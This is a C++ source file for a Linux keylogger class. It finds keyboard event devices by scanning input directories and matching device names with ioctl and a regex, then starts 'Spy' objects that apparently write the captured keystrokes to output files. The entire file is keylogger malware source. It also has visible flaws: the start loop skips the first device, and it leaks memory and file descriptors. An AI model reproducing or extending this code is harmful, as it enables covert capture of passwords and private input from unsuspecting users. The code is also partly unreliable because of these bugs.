#include "Keylogger.hpp"
#include <iostream>
#include <dirent.h>
#include <filesystem>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <fstream>
#include <regex>
#include <cstdlib>

kl::Keylogger::Keylogger(std::string output, bool debug, std::vector<std::string> inputDir)
    : _outputPath(output), _debug(debug)
{
    if (_debug)
        std::cout << "Output path : " << std::string{std::filesystem::current_path()} + "/" + _outputPath << std::endl;
    _findInputFile(inputDir);
    _createSpies();
}

static int selector(const struct dirent *files)
{
    return !std::string{files->d_name}.compare(0, 5, "event");
}

void kl::Keylogger::_createSpies()
{
    for (size_t i = 0; i < _inputs.size(); i++)
        _spies.push_back(Spy(_inputs[i], _outputPath + std::to_string(i + 1)));
}

void kl::Keylogger::start()
{
    for (size_t i = 1; i < _spies.size(); i++)
        _spies[i].start();
}

int kl::Keylogger::_openR(std::string path) const
{
    int fd{0};

    if ((fd = open(path.c_str(), O_RDONLY)) < 0)
        perror("open");
    return fd;
}

void kl::Keylogger::_scanFile(std::string &dir, directory **files, size_t i)
{
    int fd{0};
    char *infos{new char[256]};

    if ((fd = _openR(std::string{dir + "/" + files[i]->d_name})) < 0)
        return;
    ioctl(fd, EVIOCGNAME(256), infos);
    if (!std::regex_match(infos, std::regex{".*[Kk]eyboard.*"}))
        return;
    _inputs.push_back(dir + "/" + files[i]->d_name);
    if (_debug)
        std::cout << "Input file found : " << dir + "/" + files[i]->d_name << std::endl;
    close(fd);
}

void kl::Keylogger::_scanDir(std::string &dir)
{
    directory **files;
    size_t nbFile{0};

    nbFile = scandir(dir.c_str(), &files, &selector, &versionsort);
    for (size_t i = 0; i < nbFile; i++)
        _scanFile(dir, files, i);
    delete (files);
}

void kl::Keylogger::_findInputFile(const std::vector<std::string> &dirList)
{
    for (std::string dir : dirList)
        _scanDir(dir);
}
